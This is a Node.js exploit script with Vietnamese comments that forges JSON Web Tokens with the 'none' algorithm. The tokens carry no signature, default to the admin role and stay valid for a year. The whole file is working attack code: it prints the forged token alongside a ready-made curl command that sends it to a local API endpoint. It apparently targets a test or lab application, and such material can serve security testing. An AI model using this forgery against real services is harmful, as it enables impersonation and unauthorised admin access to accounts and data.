/**
 * Script khai thác lỗ hổng JWT Algorithm Confusion Attack
 * Sử dụng để tạo token giả mạo với algorithm "none"
 * 
 * Usage: node exploit_token.js [userId] [role]
 * Example: node exploit_token.js 507f1f77bcf86cd799439011 admin
 */

// Base64URL encoding function (không cần thư viện bên ngoài)
function base64urlEncode(str) {
  return Buffer.from(str)
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

function base64urlDecode(str) {
  // Thêm padding nếu cần
  str = str.replace(/-/g, '+').replace(/_/g, '/');
  while (str.length % 4) {
    str += '=';
  }
  return Buffer.from(str, 'base64').toString('utf8');
}

function createFakeToken(userId, role = 'admin', daysValid = 365) {
  /**
   * Tạo JWT token giả mạo với algorithm "none"
   * 
   * @param {string} userId - MongoDB ObjectId của user muốn giả mạo
   * @param {string} role - Role muốn gán (admin hoặc user)
   * @param {number} daysValid - Số ngày token có hiệu lực
   * @returns {string} JWT token string
   */
  
  // Header với algorithm "none" - không cần signature
  const header = {
    alg: 'none',
    typ: 'JWT'
  };
  
  // Payload với thông tin user
  const now = Math.floor(Date.now() / 1000);
  const payload = {
    userId: userId,
    role: role,
    iat: now,
    exp: now + (daysValid * 24 * 60 * 60), // days to seconds
    sub: 'accessApi'
  };
  
  // Encode header và payload
  const headerEncoded = base64urlEncode(JSON.stringify(header));
  const payloadEncoded = base64urlEncode(JSON.stringify(payload));
  
  // Token với algorithm "none" - signature là chuỗi rỗng
  const token = `${headerEncoded}.${payloadEncoded}.`;
  
  return token;
}

function main() {
  console.log('='.repeat(60));
  console.log('JWT Algorithm Confusion Attack - Token Generator');
  console.log('='.repeat(60));
  console.log();
  
  // Nhận input từ command line arguments
  const args = process.argv.slice(2);
  let userId, role;
  
  if (args.length > 0) {
    userId = args[0];
  } else {
    // Nếu không có argument, sử dụng giá trị mặc định cho demo
    userId = '507f1f77bcf86cd799439011';
    console.log(`Sử dụng User ID mặc định: ${userId}`);
    console.log('(Có thể truyền User ID và Role qua arguments)');
    console.log('Usage: node exploit_token.js <userId> <role>');
    console.log();
  }
  
  if (args.length > 1) {
    role = args[1];
  } else {
    role = 'admin';
  }
  
  if (!['admin', 'user'].includes(role)) {
    console.error('Error: Role phải là "admin" hoặc "user"');
    process.exit(1);
  }
  
  // Tạo token
  const token = createFakeToken(userId, role);
  
  console.log('='.repeat(60));
  console.log('TOKEN GIẢ MẠO ĐÃ ĐƯỢC TẠO:');
  console.log('='.repeat(60));
  console.log(token);
  console.log();
  console.log('='.repeat(60));
  console.log('CÁCH SỬ DỤNG:');
  console.log('='.repeat(60));
  console.log(`curl -X GET http://localhost:3000/api/v1/users/current \\`);
  console.log(`  -H "Authorization: Bearer ${token}"`);
  console.log();
  console.log('Hoặc sử dụng trong Postman/Insomnia:');
  console.log(`Authorization: Bearer ${token}`);
  console.log();
  
  // Decode để xem nội dung
  try {
    const parts = token.split('.');
    const header = JSON.parse(base64urlDecode(parts[0]));
    const payload = JSON.parse(base64urlDecode(parts[1]));
    
    console.log('='.repeat(60));
    console.log('NỘI DUNG TOKEN:');
    console.log('='.repeat(60));
    console.log('Header:', JSON.stringify(header, null, 2));
    console.log();
    console.log('Payload:', JSON.stringify(payload, null, 2));
    console.log();
  } catch (error) {
    console.error(`Lỗi khi decode token: ${error.message}`);
  }
}

// Chạy script
if (require.main === module) {
  main();
}

module.exports = { createFakeToken };

